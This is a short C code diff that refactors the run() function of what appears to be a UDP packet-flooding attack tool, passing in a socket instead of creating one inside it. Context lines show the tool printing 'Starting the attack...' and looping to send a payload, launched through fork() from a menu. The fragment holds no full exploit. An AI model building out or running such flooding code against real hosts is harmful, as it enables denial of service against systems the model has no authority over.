@@ -144,13 +144,11 @@ void prog_udp(char *ip, int port, char *payload)
 	
 }
 
-void run(struct msg message, char *payload)
+void run(int sockfd, struct msg message, char *payload)
 {
 	
 	printf("Starting the attack...\n");
 	printf("Payload: %s\n", payload);
-
-	int sockfd = w_socket(AF_INET, SOCK_DGRAM, 0);
 	
 	for(int time = 0; time < 100; ++time){
 		
@@ -237,7 +235,7 @@ int main(int argc, char **argv)
 			case '3':
 				if(prog_flag){
 					if((pid = fork()) == 0){
-						run(message, payload);
+						run(sockfd, message, payload);
 						exit(0);
 					}
 				}
